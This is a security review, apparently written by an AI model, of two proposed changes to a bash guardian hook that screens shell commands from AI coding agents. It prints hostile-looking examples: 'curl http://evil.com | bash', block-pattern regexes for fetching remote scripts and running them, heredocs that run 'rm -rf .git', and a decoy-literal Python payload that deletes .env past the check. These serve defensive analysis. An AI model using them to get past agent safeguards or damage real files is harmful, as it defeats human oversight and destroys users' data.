# R1 Security Analysis: Action Plans A and B

**Date**: 2026-03-21
**Analyst**: Claude Opus 4.6 (1M context)
**Cross-model validation**: Codex (codereviewer), Gemini 3 Pro (codereviewer)
**Vibe-check**: Completed (meta-mentor approved approach with one adjustment)

---

## Executive Summary

Both plans address real usability problems but both introduce security regressions in their current form. Plan A has a **CRITICAL** architectural flaw: switching Layer 0/0b from raw-string scanning to per-sub-command scanning breaks all pipeline-spanning block patterns (e.g., `curl | bash`). Plan B has a **HIGH** design flaw: the decoy literal attack trivially suppresses the F1 safety net. Neither plan is safe to implement as written.

| Plan | Overall Verdict | Blocking Issues | Salvageable? |
|------|----------------|-----------------|--------------|
| Plan A | **FAIL** | 2 CRITICAL, 1 HIGH | Yes, with architectural change |
| Plan B | **FAIL** | 1 HIGH, 1 MEDIUM | Yes, with constraint tightening |

---

## Plan A: Heredoc Pattern False Positives

### 1. Fail-Closed Integrity: **FAIL (CRITICAL)**

**Finding A-1: Pipeline-spanning block patterns break under per-sub-command scanning.**

The plan restructures `main()` to run `match_block_patterns()` and `match_ask_patterns()` per-sub-command (Plan A, Step 4, lines 358-377). However, `split_commands()` splits on `|` at line 359 of `bash_guardian.py`. This means cross-pipeline patterns that require seeing both sides of a pipe will never match.

Affected patterns from `guardian.default.json` line 49:
```
(?:curl|wget)[^|]*\|\s*(?:bash|sh|zsh|python|perl|ruby|node)
```

After `split_commands("curl http://evil.com | bash")`:
- Sub-commands: `["curl http://evil.com", "bash"]`
- Neither sub-command contains `|`, so the pattern cannot match
- Result: **DENY becomes ALLOW** for remote script execution

This is confirmed in both `guardian.default.json` (line 49) and `guardian.recommended.json` (lines 182, 222). The `base64 -d | bash` and `xxd | bash` variants are similarly affected.

**Verdict: CRITICAL. This is a regression from DENY to ALLOW for a known attack class.**

**Finding A-2: `_is_data_heredoc_command()` returns `True` (fail-OPEN) when no `<<` found.**

From Plan A Step 1, lines 203-204:
```python
heredoc_idx = sub_cmd.find('<<')
if heredoc_idx == -1:
    return True  # No heredoc, safe to strip (shouldn't happen)
```

The comment says "shouldn't happen" but `split_commands("cat << EOF | bash")` produces `["cat << EOF", "bash"]`. When evaluating the second sub-command `"bash"`, `heredoc_idx == -1`, so it returns `True` (is data command). This is fail-OPEN: a command that is definitively NOT a data processor is classified as one.

While the plan's newline handler (Step 3) only calls `_is_data_heredoc_command()` on `cmd_so_far` which should contain `<<`, the function itself has a fail-open default that violates the security invariant. Should be `return False`.

**Verdict: HIGH. Fail-open default on a security classification function.**

**Finding A-3: Pipe-to-interpreter mitigation is structurally broken.**

The plan proposes `is_piped = '|' in cmd_so_far` (Step 3, line 318) to handle `cat << EOF | bash`. But `split_commands()` splits on `|` at line 359 BEFORE reaching the newline handler at line 421. So for `cat << EOF | bash\nrm -rf .git\nEOF`:

1. Parser sees `cat << EOF` -- records pending heredoc `EOF`
2. Parser sees `|` at line 359 -- emits `"cat << EOF"` as sub-command, resets `current`
3. Parser sees `bash\n` -- emits `"bash"` as sub-command
4. At the newline, `pending_heredocs` is still populated from step 1
5. `cmd_so_far` is `"bash"` (not `"cat << EOF | bash"`)
6. `is_piped = '|' in "bash"` is `False`
7. `_is_data_heredoc_command("bash")` returns `True` (per A-2 above: no `<<` found)
8. `retain = not True or False = False` -- body is STRIPPED
9. The `rm -rf .git` heredoc body is silently discarded

**Verdict: CRITICAL. The pipe-to-interpreter mitigation does not work with the current split_commands() architecture.**

### 2. Parsing Differential Risk: **CONCERN**

The plan introduces two representations of the command:
- Raw string (no longer used for Layer 0/0b)
- Sub-commands with selective body content

The Gemini reviewer correctly notes this creates a parsing differential between "what the guardian sees" and "what bash executes." The recommended alternative -- a `strip_data_heredocs(raw_string)` function that removes only data heredoc bodies while preserving all operators -- would eliminate this differential. However, the plan explicitly rejected this approach (Step 1 rationale, lines 145-149) due to concern about creating a separate parser. This rejection is incorrect: the recommended approach does NOT create a separate parser; it uses `split_commands()` internally to identify data heredoc bodies, then produces a sanitized version of the original raw string.

**Verdict: CONCERN. The rejection of the "strip before scan" approach was based on a mischaracterization.**

### 3. Attack Surface Change: **EXPANDS (CRITICAL)**

- **Shrinks**: Data heredoc false positives eliminated (usability improvement)
- **Expands**: Pipeline-spanning block patterns stop matching (CRITICAL regression)
- **Expands**: `cat << EOF | bash` body becomes invisible (CRITICAL regression)
- **Net**: Attack surface expansion. A class of currently-blocked attacks becomes allowed.

### 4. Subsumption Claim: **FAIL**

Plan A claims to subsume `interpreter-heredoc-bypass.md` (Plan A lines 408-416). Let me trace each vector from that plan:

| Vector | interpreter-heredoc-bypass.md | Plan A handling | Subsumes? |
|--------|-------------------------------|-----------------|-----------|
| `bash << EOF` | INVISIBLE to all layers | Body RETAINED (bash not in allowlist). Block patterns scan `"bash << EOF\nrm -rf .git"`. Pattern `(?:rm\|rmdir\|...).*\.git` would match in the body. | **PARTIAL**: Block patterns match, but Layer 3/4 `is_delete_command()` and `extract_paths()` still only see the sub-command string, not a structured parse of body content. F1 would fire but with no paths. |
| `source /dev/stdin << EOF` | INVISIBLE | `source` not in `_DATA_HEREDOC_COMMANDS`, body RETAINED. | **PARTIAL**: Same Layer 3/4 gap. |
| `python3 << EOF` | INVISIBLE | `python3` not in allowlist, body RETAINED. Block pattern `python3\s[^|&\n]*os\.remove` would need to match across newlines in the retained body. But `[^|&\n]*` stops at `\n`. **Pattern does NOT match.** | **FAIL**: The block pattern regex cannot match multiline heredoc bodies because `[^|&\n]*` character class excludes newlines. |
| `cat << EOF \| bash` | Not in original plan (listed as "separate vector") | Body STRIPPED due to pipe-to-interpreter mitigation failure (Finding A-3). | **FAIL**: Body invisible. |
| `perl << 'PERL'` | INVISIBLE | `perl` not in allowlist, body RETAINED. | **PARTIAL**: Same `[^|&\n]*` newline issue in block patterns. |

**Verdict: FAIL. Plan A does NOT subsume interpreter-heredoc-bypass.md. The `[^|&\n]*` character class in block pattern regexes prevents matching across newline boundaries in retained heredoc bodies. Additionally, Layers 3/4 have no mechanism to parse retained body content for path extraction or command type detection.**

### 5. Edge Case Completeness: **PARTIAL**

**Identified and handled:**
- Backslash-escaped delimiter (Edge Case 7) -- good catch, genuine bug fix
- Multiple heredocs on one line (Edge Case 5) -- correctly analyzed
- Here-string `<<<` (Edge Case 6) -- already handled
- Database CLI shell escapes (Edge Case 3) -- correctly removed from allowlist

**Missing:**
- **Pipeline-spanning patterns**: Not identified as an edge case (CRITICAL, see A-1)
- **`[^|&\n]*` in block patterns vs multiline bodies**: Not identified (breaks subsumption claim)
- **`_is_data_heredoc_command` called on sub-command without `<<`**: Not identified (A-2)
- **Process substitution**: `bash <(cat << EOF\nrm -rf .git\nEOF)` -- not analyzed
- **Nested heredocs**: `bash << 'OUTER'\ncat << 'INNER'\nsafe\nINNER\nrm -rf .git\nOUTER` -- not analyzed

### 6. Complexity Budget: **CONCERN**

`bash_guardian.py` is already 1,289 LOC. Plan A adds ~100 LOC (allowlist, helper function, flow restructuring). The complexity is somewhat justified for the usability gain, but the architectural change (moving `split_commands()` before Layer 0/0b) is a high-risk refactoring that touches the most critical code path.

**Recommendation**: The simpler alternative -- `strip_data_heredocs(raw_string)` that produces a sanitized raw string for Layer 0/0b while preserving operators -- achieves the same usability goal with lower architectural risk.

### 7. Test Coverage: **PARTIAL**

**Good coverage:**
- `_is_data_heredoc_command()` unit tests (13 tests)
- Selective body retention tests (5 tests)
- Layer 0 false positive regression tests (3 tests)
- Interpreter heredoc detection tests (4 tests)
- Safety regression tests (5 tests)

**Missing tests:**
- Pipeline-spanning block patterns after restructuring (CRITICAL gap)
- `curl http://evil.com | bash` must still be blocked after the change
- `base64 -d ... | bash` must still be blocked
- `cat << EOF | bash` body must be scanned
- Multiline heredoc body matching against block patterns
- `_is_data_heredoc_command` with no `<<` in input
- Process substitution with heredoc

**Test for mysql/psql**: Lines 470-475 test `mysql` and `psql` as data commands, but these were REMOVED from the allowlist per Edge Case 3. The tests are stale and would fail.

---

## Plan B: Interpreter Path Resolution

### 1. Fail-Closed Integrity: **FAIL (HIGH)**

**Finding B-1: Decoy literal suppresses F1 without resolving the actual destructive target.**

The function `extract_paths_from_interpreter_payload()` extracts ALL string literals from interpreter payloads and returns any that look like paths within the project. The modified F1 block (Plan B lines 170-174) suppresses the ASK when `interpreter_paths` is non-empty:

```python
if interpreter_paths:
    sub_paths = interpreter_paths
    all_paths.extend(sub_paths)
    # Fall through to path validation loop below
```

Attack payload:
```python
python3 -c "safe='./temp/ok.txt'; import os; os.remove(chr(46)+'env')"
```

Trace:
1. `check_interpreter_payload()` detects `os.remove` -- `is_delete = True`
2. `extract_paths()` returns `[]` (no shell-level paths)
3. F1 condition: `is_delete and not sub_paths` -- would fire
4. `is_interpreter_op = True`
5. `extract_paths_from_interpreter_payload()` extracts `'./temp/ok.txt'`
6. `_is_within_project_or_would_be(Path('./temp/ok.txt'), project_dir)` returns `True` (even if file doesn't exist, per line 1006: `resolve(strict=False)`)
7. `interpreter_paths = [Path('/project/temp/ok.txt')]` -- non-empty
8. F1 **suppressed**. `sub_paths` set to `[Path('/project/temp/ok.txt')]`
9. Path validation loop checks `temp/ok.txt` -- passes all checks (not zeroAccess, not noDelete)
10. Final verdict: **ALLOW**
11. But the actual target is `.env` (constructed via `chr()`) -- **completely invisible**

The plan's mitigation claim (lines 237-244) states "ALL extracted paths" are validated, but this is irrelevant -- the malicious target `chr(46)+'env'` is never extracted as a string literal.

**Verdict: HIGH. Decoy literal attack downgrades ASK to ALLOW. The fail-closed claim is incorrect.**

**Caveat on threat model**: The plan correctly notes (line 242) that AI agents generate straightforward code, not obfuscated payloads. Against the stated threat model (accidental AI agent destruction), this attack requires an adversary injecting obfuscated code through prompt injection. While the threat model mitigates urgency, the code violates the stated fail-closed invariant.

### 2. Parsing Differential Risk: **CONCERN**

The `_STRING_LITERAL_PATTERN` regex extracts string literals differently than the actual interpreter would parse them:

- Does NOT handle triple-quoted strings (`'''path'''`)
- Does NOT handle f-strings (`f".claude/{var}"`)
- Does NOT handle raw strings fully (`r'.claude/path'` -- the `r` prefix is outside the regex)
- Does NOT handle string concatenation (`"." + "env"`)

These are all documented as "fail-closed" cases (F1 still fires), which is correct. However, the inverse concern is more dangerous: cases where the regex DOES extract a literal that the interpreter doesn't treat as a path (e.g., a string in a comment, a docstring, or an unused variable).

**Verdict: CONCERN. The parsing differential is biased toward false extraction (extracting strings that aren't targets), which feeds the decoy literal attack.**

### 3. Attack Surface Change: **EXPANDS (MEDIUM)**

- **Shrinks**: False positive ASK popups reduced for legitimate interpreter cleanup commands (usability)
- **Expands**: F1 safety net can be suppressed by decoy literals (HIGH, per B-1)
- **Expands**: `glob.glob()` on attacker-controlled input enables filesystem probing and potential DoS (MEDIUM, per B-2)
- **Net**: Slight attack surface expansion, partially mitigated by threat model

**Finding B-2: `glob.glob()` on untrusted input.**

Plan B line 129: `expanded = glob.glob(str(path))`

An attacker can supply a deeply nested glob pattern: `'/*/*/*/*/*/*/*/*/*'`. This causes `glob.glob()` to enumerate the filesystem recursively, potentially causing:
1. DoS (CPU/memory exhaustion, freezing the guardian hook)
2. Timing oracle (response time reveals filesystem structure)

The plan's security notes (line 406) acknowledge this but call it non-blocking.

**Verdict: MEDIUM. glob.glob() without depth/scope limits on attacker-controlled input is a DoS vector. Should restrict to project directory and limit glob depth.**

### 4. Edge Case Completeness: **GOOD (with gaps)**

**Well-documented:**
- f-string, string concatenation, triple-quoted strings (fail-closed)
- Raw strings (partially handled)
- Empty payload (fail-closed)
- Non-path strings filtered
- Multiple paths with one unsafe (F1 fires)
- Glob with no matches (fail-closed)
- Paths outside project (rejected)

**Missing:**
- **Decoy literal attack** (documented but incorrectly dismissed, see B-1)
- **Glob DoS** (acknowledged but no mitigation proposed)
- **Interpreter heredocs** (`python3 << EOF\nos.remove('.env')\nEOF`): `extract_interpreter_payload()` looks for `-c`/`-e` flags, NOT heredoc input. This function returns `None` for heredoc-fed interpreters, so `is_interpreter_op = False`, and the new code path never activates. This is correct behavior (heredoc interpreters are a separate problem addressed by Plan A / interpreter-heredoc-bypass.md), but should be explicitly documented.
- **Multiple destructive calls with different targets**: `python3 -c "os.remove('./safe.txt'); os.remove('.env')"` -- `os.remove` detected once, but both `.env` and `./safe.txt` are extracted. `.env` matches zeroAccess, so DENY. This case works correctly.

### 5. Complexity Budget: **PASS**

~65 LOC added to `_guardian_utils.py` and ~15 LOC to `bash_guardian.py`. The change is scoped to the F1 block, does not restructure the main flow, and reuses existing validation infrastructure. Complexity is justified for the usability improvement.

### 6. Test Coverage: **PARTIAL**

**Good coverage:**
- Basic extraction tests (single file, glob, no literals, obfuscated)
- Non-path string filtering
- Non-interpreter commands
- Node and Perl extractors
- Integration tests (staging cleanup, .env protection)

**Missing tests:**
- Decoy literal attack (test exists at line 342 but assertion is incomplete: "F1 should still fire because we need ALL paths to be safe" -- this is wrong, the current design does NOT require all paths to match destructive sinks)
- Glob DoS (`'/*/*/*/*/*/*/*/*/*'` pattern)
- Multiple destructive calls with mixed safe/unsafe targets
- Heredoc-fed interpreter (should return empty, documenting that this path is not handled)
- Raw string prefix: `r'./path'`

---

## Cross-Model Consensus

Both Codex and Gemini independently identified the same critical findings:

| Finding | Codex | Gemini | This Analysis |
|---------|-------|--------|---------------|
| Plan A: Pipeline pattern breakage | CRITICAL | CRITICAL | CRITICAL (A-1) |
| Plan A: Pipe-to-interpreter mitigation failure | HIGH | CRITICAL | CRITICAL (A-3) |
| Plan A: Subsumption claim invalid | HIGH | (implicit) | FAIL |
| Plan B: Decoy literal F1 suppression | HIGH | CRITICAL | HIGH (B-1) |
| Plan B: glob.glob() DoS/oracle | (implicit) | HIGH | MEDIUM (B-2) |

**Unanimous**: Both plans are NOT safe to implement as written.

---

## Recommended Remediation

### Plan A: Architectural Redesign Required

**Do NOT switch Layer 0/0b to per-sub-command scanning.** Instead:

1. **Strip-then-scan approach**: Create `strip_data_heredoc_bodies(raw_command)` that:
   - Uses `split_commands()` internals to identify heredoc boundaries
   - Replaces data heredoc bodies with empty content in the raw string
   - Retains interpreter heredoc bodies
   - Preserves ALL operators (`|`, `;`, `&&`, etc.)
   - Returns the sanitized raw string for Layer 0/0b scanning

2. **Fix `_is_data_heredoc_command()` default**: Change `return True` to `return False` when `heredoc_idx == -1`.

3. **Fix `_parse_heredoc_delimiter()` backslash handling**: This is a genuine bug fix that should proceed regardless.

4. **Do NOT claim subsumption of interpreter-heredoc-bypass.md**: The `[^|&\n]*` character class in block patterns prevents matching multiline heredoc bodies. A dedicated interpreter-heredoc safeguard is still needed.

5. **Add unterminated heredoc detection**: When `_consume_heredoc_bodies()` exhausts input without finding delimiter, flag as `ask`.

### Plan B: Constraint Tightening Required

1. **Require destructive sink argument resolution, not generic literal harvesting**: Only suppress F1 if the extracted path is the ARGUMENT to the detected destructive API call. This requires at minimum:
   - For Python: `ast.parse()` to find the actual argument to `os.remove()` etc.
   - For other interpreters: Fail-closed (keep F1)
   - The regex approach is fundamentally unsound for this purpose

2. **Restrict glob.glob() scope**:
   - Only expand globs rooted within the project directory
   - Limit glob pattern depth (max 3 wildcards)
   - Add a timeout wrapper

3. **Fix the decoy literal test**: The test at Plan B line 342 has an incorrect assertion. It should verify that F1 still fires when ANY extracted path cannot be matched to a destructive sink.

4. **Consider AST-only approach**: Drop the regex phase entirely and only implement the Phase 2 AST-based extraction (Plan B lines 187-206) for Python, keeping F1 fail-closed for all other interpreters.

---

## Files Referenced

- `/home/idnotbe/projects/claude-code-guardian/action-plans/heredoc-pattern-false-positives.md` (Plan A)
- `/home/idnotbe/projects/claude-code-guardian/action-plans/interpreter-path-resolution.md` (Plan B)
- `/home/idnotbe/projects/claude-code-guardian/action-plans/interpreter-heredoc-bypass.md` (existing plan, NOT subsumed)
- `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/bash_guardian.py` (lines 350-430, 476-506, 991-1011, 1040-1061, 1410-1540)
- `/home/idnotbe/projects/claude-code-guardian/hooks/scripts/_guardian_utils.py` (lines 860-1046)
- `/home/idnotbe/projects/claude-code-guardian/assets/guardian.default.json` (lines 49, 69-83)
- `/home/idnotbe/projects/claude-code-guardian/assets/guardian.recommended.json` (lines 182, 222)
